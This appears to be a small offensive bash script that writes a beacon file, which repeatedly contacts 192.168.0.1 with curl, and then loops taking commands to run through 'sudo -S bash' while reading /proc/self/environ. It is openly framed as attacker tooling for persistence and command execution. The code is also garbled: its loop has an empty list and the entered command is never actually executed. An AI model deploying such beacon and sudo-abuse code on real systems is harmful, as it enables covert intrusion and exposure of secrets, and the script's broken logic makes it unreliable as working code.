#!/bin/bash

# Persistence
if ! [ -f "/tmp/beacon.sh" ]; then
    echo "Persistence script created."
    echo '#!/bin/bash
while true; do
        curl 192.168.0.1
        sleep 10
done' > /tmp/beacon.sh
fi

# Execution & Return
function execute_command {
    command=$1
    output=$(echo $command | sudo -S bash -c 'exec < /proc/self/environ && for i in ; do printf "$i\n"; done')
    echo $output
}

while true; do
    read -p "Enter command: " cmd
    result=$(execute_command $cmd)
    echo "Result: $result"
done
